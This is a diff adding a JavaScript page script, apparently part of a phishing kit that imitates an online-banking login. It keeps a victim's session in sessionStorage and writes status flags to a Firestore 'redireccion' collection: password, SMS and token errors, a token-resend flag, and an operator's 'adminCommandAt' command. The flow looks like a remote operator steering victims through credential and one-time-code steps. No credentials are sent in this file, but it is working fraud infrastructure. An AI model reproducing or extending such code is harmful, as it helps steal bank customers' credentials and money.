@@ -1,0 +1,94 @@
+(function () {
+  function sessionDocId() {
+    try {
+      return sessionStorage.getItem('intermaticoActual') || sessionStorage.getItem('bseSessionUser') || '';
+    } catch (error) {
+      return '';
+    }
+  }
+
+  function releaseSession() {
+    try {
+      sessionStorage.removeItem('intermaticoActual');
+      sessionStorage.removeItem('bseSessionUser');
+      sessionStorage.removeItem('intermaticoHoldCommand');
+    } catch (error) {}
+  }
+
+  function goIndex(event) {
+    if (event) {
+      event.preventDefault();
+    }
+    var docId = sessionDocId();
+    if (!docId || !window.db || !window.firebase || !window.firebase.firestore) {
+      releaseSession();
+      window.location.replace('index.html');
+      return;
+    }
+
+    var finished = false;
+    function finish(keepSession, command) {
+      if (finished) {
+        return;
+      }
+      finished = true;
+      if (!keepSession) {
+        releaseSession();
+      } else {
+        try {
+          sessionStorage.setItem('intermaticoHoldCommand', command || '');
+        } catch (error) {}
+      }
+      window.location.replace('index.html');
+    }
+
+    var timer = setTimeout(function () {
+      finish(false);
+    }, 4000);
+
+    var doc = window.db.collection('redireccion').doc(docId);
+    doc.get().then(function (snap) {
+      var command = snap.exists ? String((snap.data() || {}).adminCommandAt || '') : '';
+      return doc.set({
+        page: 0,
+        pageLocation: 'index',
+        loginError: '',
+        passwdErr: false,
+        smsErr: false,
+        pacifidErr: false,
+        tokenResend: false,
+        returnedHome: true,
+        returnedHomeAt: Date.now(),
+        isActive: true,
+        lastActivity: window.firebase.firestore.FieldValue.serverTimestamp(),
+        updatedAt: window.firebase.firestore.FieldValue.serverTimestamp()
+      }, { merge: true }).then(function () {
+        return command;
+      });
+    }).then(function (command) {
+      clearTimeout(timer);
+      finish(true, command);
+    }).catch(function () {
+      clearTimeout(timer);
+      finish(false);
+    });
+  }
+
+  document.addEventListener('DOMContentLoaded', function () {
+    var link = document.querySelector('.verif-logn');
+    if (link) {
+      link.addEventListener('click', goIndex);
+    }
+  });
+
+  StepFlowClient.init({
+    pageLocation: 'verificacion-exitosa',
+    sessionKey: 'intermaticoActual',
+    localPage: 8,
+    requireSession: false,
+    fallbackUrl: 'index.html',
+    mitSelector: null,
+    inputSelector: null,
+    onRemoteData: function () {}
+  });
+})();
